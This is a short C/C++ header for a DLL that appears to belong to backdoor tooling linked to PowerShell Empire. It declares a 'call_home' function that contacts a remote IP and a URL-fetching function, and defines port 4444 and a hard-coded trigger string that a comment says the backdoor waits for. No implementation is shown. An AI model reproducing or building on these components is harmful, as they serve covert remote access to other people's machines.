#ifndef __PSE_INC__
#define __PSE_INC__

#pragma once  

#ifdef PSE_LIB_EXPORTS								// Defined in ws-client.cpp before including this header file
	#define PSE_LIB__API __declspec(dllexport)   
#else  
	#define PSE_LIB__API __declspec(dllimport)		// Iff we want to link to dll in another project, use this header file without defining PSE_LIB_EXPORTS somewhere

	PSE_LIB__API LPCTSTR  getstring(LPCTSTR pUrl);
	PSE_LIB__API int __cdecl call_home(const std::string &_ip, const std::string &_msg);
#endif												// endif PSE_LIB_EXPORTS

#define PSE_PORT				"4444"
#define PSE_BACKDOOR_TRIGGER	"QAZWSX123"			// The unique value the PowershellEmpire backdoor is waiting for

//
#endif												// endif __PSE_INC__